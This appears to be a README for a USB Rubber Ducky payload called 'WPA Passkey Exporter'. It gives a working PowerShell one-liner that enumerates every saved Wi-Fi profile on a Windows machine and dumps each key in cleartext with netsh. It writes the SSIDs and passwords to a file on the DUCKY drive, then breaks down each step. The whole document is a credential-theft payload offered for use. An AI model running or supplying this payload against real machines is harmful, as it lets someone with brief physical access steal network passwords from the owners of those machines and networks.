# WPA Passkey Exporter 
Version 1, TODO is listed in the payload

## Full Powershell:

```Powershell
$m=(Get-Volume -FileSystemLabel 'DUCKY').DriveLetter;$d=netsh wlan show profile;$d=$d | Where-Object{$_ -match "All User Profile"};$d=$d -split ": " | Where-Object{$_ -notmatch "All User Profile"};$p=$d | ForEach-Object -process{netsh wlan show profiles $_ key=clear};$p | Select-String "SSID name","Key Content" >> $m':\'wireless'.txt'
```
#### First, get the drive letter of the ducky and assign it to the varaiable m. 
```Powershell
$m=(Get-Volume -FileSystemLabel 'DUCKY').DriveLetter
```
#### Next, Display all of the SSID's of the connected and previously connected wireless connections and assign it to variable d for Data
```Powershell
$d=netsh wlan show profile
```
#### Then, parse out the unnecessary information just to keep the SSID and only the SSID
```Powershell
$d=$d | Where-Object{$_ -match "All User Profile"};$d=$d -split ": " | Where-Object{$_ -notmatch "All User Profile"}
```
#### Declare a Passwords variable (p) takes each SSID from $d and runs it through the command [netsh wlan show profiles [ssid] key=clear]
```Powershell
$p=$d | ForEach-Object -process{netsh wlan show profiles $_ key=clear}
```
#### Finally, parse out the SSID and Passwords from $p, and write it to a file called Wireless.txt on the DUCKY drive
```Powershell
$p | Select-String "SSID name","Key Content" >> $m':\'wireless'.txt'
```
